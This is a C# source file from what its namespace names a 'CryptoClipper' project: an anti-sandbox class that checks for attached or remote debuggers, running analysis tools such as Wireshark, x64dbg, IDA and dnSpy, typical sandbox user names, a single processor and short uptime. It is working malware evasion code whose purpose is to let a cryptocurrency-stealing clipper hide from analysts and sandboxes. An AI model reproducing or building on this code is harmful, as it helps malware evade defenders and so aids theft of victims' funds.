using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace CryptoClipper.Stealth;

[SupportedOSPlatform("windows")]
public static class AntiSandbox
{
    private static readonly string[] SandboxProcesses =
    [
        "wireshark", "fiddler", "processhacker", "procmon",
        "x32dbg", "x64dbg", "ida", "ollydbg", "dnspy",
        "httpdebugger", "charles"
    ];

    private static readonly string[] SandboxUsers =
    [
        "sandbox", "virus", "malware", "maltest",
        "currentuser", "john", "user", "emily"
    ];

    public static bool IsAnalysisEnvironment()
    {
        if (IsDebuggerPresent())
            return true;

        if (HasSandboxProcesses())
            return true;

        if (HasSandboxUserName())
            return true;

        if (HasLowResourceCount())
            return true;

        if (HasRecentUptime())
            return true;

        return false;
    }

    private static bool IsDebuggerPresent() =>
        Debugger.IsAttached || CheckRemoteDebugger();

    private static bool HasSandboxProcesses()
    {
        var running = Process.GetProcesses()
            .Select(p => p.ProcessName.ToLowerInvariant())
            .ToHashSet();

        return SandboxProcesses.Any(running.Contains);
    }

    private static bool HasSandboxUserName()
    {
        string user = Environment.UserName.ToLowerInvariant();
        return SandboxUsers.Contains(user);
    }

    private static bool HasLowResourceCount() =>
        Environment.ProcessorCount < 2;

    private static bool HasRecentUptime() =>
        Environment.TickCount64 < TimeSpan.FromMinutes(5).TotalMilliseconds;

    [DllImport("kernel32.dll")]
    private static extern bool CheckRemoteDebuggerPresent(nint hProcess, out bool isDebuggerPresent);

    private static bool CheckRemoteDebugger()
    {
        try
        {
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, out bool debugger);
            return debugger;
        }
        catch
        {
            return false;
        }
    }
}
